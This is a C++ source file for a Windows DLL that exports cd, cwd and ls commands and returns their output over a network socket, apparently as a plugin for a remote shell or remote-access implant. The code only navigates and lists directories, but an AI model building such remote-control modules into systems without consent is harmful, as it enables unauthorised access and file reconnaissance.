#include "../core/external.h"

extern "C" __declspec(dllexport) void cd(const char *arg)
{
    if(!SetCurrentDirectory(arg))
        sc_printf("failed to cd into %s\n", arg);
}

extern "C" __declspec(dllexport) void cwd(const char *arg)
{
    DWORD cnt = GetCurrentDirectory(DllMeta.net.buf_sz/sizeof(TCHAR), DllMeta.net.buf);
    DllMeta.net.buf[cnt * sizeof(TCHAR)] = TEXT('\n');
    DllMeta.net.buf[(cnt + 1) * sizeof(TCHAR)] = TEXT('\0');
    send(DllMeta.net.sock, DllMeta.net.buf, cnt + 2, 0);
}

extern "C" __declspec(dllexport) void ls(const char *arg)
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATA ffd;
    
    char buf[MAX_PATH];
    GetCurrentDirectory(sizeof(buf) - 3, buf);
    strcat(buf, "\\*");
    
    if((hFile = FindFirstFile(buf, &ffd)) == INVALID_HANDLE_VALUE){
        sc_printf("FindFirstFile error: %d", GetLastError());
        return;
    }
    
    do{
        sc_printf("%s\n", ffd.cFileName);
    }while(FindNextFile(hFile, &ffd));
    
    FindClose(hFile);
}
